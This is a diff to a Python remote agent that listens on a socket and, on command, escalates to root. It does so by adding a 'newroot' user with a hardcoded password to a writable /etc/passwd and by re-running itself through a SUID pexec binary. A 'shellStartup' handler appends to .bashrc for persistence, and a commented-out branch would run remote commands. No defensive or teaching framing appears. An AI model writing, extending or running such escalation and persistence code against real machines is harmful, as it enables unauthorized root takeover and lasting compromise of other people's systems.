@@ -46,6 +46,9 @@ def escalate_weak_passwd():
     """
     Privilege Escalation: Weak File Permissions - Writable /etc/passwd
     Modifies /etc/passwd to add a new root user.
+
+    After, run the command: "su newroot"
+    and enter "newpasswordhere" when prompted for the password
     """
     new_username = "newroot"
     new_password = "newpasswordhere"
@@ -72,9 +75,13 @@ def escalate_suid_pexec():
     Executes a root shell using SUID-enabled pexec.
     """
     try:
-        result = run_command('/path/to/pexec /bin/bash')
-        print("SUID exploit using pexec succeeded. Check shell output:")
-        print(result.stdout)
+        #result = run_command('/path/to/pexec /bin/bash')
+        
+        print("SUID exploit")
+        #result = run_command('pexec /bin/sh -p -c "python ' + THIS_FILE + '"')
+        subprocess.Popen(['pexec', 'python' , THIS_FILE],start_new_session=True)
+        print("SUID exploit using pexec succeeded.")
+        
     except Exception as e:
         print(f"SUID pexec escalation failed: {e}")
 
@@ -149,7 +156,7 @@ def handle_conn(conn, addr):
         # For example, you could send a length value before any command, decide on null byte as ending,
         # base64 encode every command, etc
         data = conn.recv(1024) 
-        print("received: " + data.decode("utf-8", errors="replace"))
+        print("received: " + data.decode("utf-8", errors="replace").strip())
 
         if data.decode("utf-8", errors="replace").strip() == "PRIVEXEC":
             print("DOING ESCALATION")
@@ -157,25 +164,25 @@ def handle_conn(conn, addr):
             escalate_privileges()
             return
         
-        # if data.decode("utf-8", errors="replace").strip().startswith() == "CMD":
-        #    parts = data.split(" ", 3)  # Split into three parts
-        #    command_length = int(parts[1])
-        #    command = parts[2]
-        #    # Run the command using handle_rlc
-        #    handle_rlc(conn, command_length, command)
-        #    return
+        """if data.decode("utf-8", errors="replace").strip().startswith() == "CMD":
+         #   parts = data.split(" ", 3)  # Split into three parts
+         #   command_length = int(parts[1])
+            command = parts[2]
+            # Run the command using handle_rlc
+            handle_rlc(conn, command_length, command)
+            return"""
 
         if data.decode("utf-8", errors="replace").strip() == "ESCALATE_PASSWD":
             print("DOING Password ESCALATION")
             #subprocess.run(["pkexec", path_to_python, script_path])
-            escalate_privileges()  # Elevate to root
+            #escalate_privileges()  # Elevate to root
             escalate_weak_passwd()
             return
         
         if data.decode("utf-8", errors="replace").strip() == "ESCALATE_PEXEC":
             print("DOING SUID pexec escalation")
             #subprocess.run(["pkexec", path_to_python, script_path])
-            escalate_privileges() # elevate to root
+            #escalate_privileges() # elevate to root
             escalate_suid_pexec()
             return
 
@@ -187,6 +194,7 @@ def handle_conn(conn, addr):
             additional_data = conn.recv(1024).decode("utf-8", errors="replace")
             conn.sendall(additional_data.encode())
             print(f"Sent data: {additional_data}")
+
         if data.decode("utf-8", errors="replace").strip() == "shellStartup":
             print("aaaaaaaaaa")
             fileBash = open(".bashrc", "a")
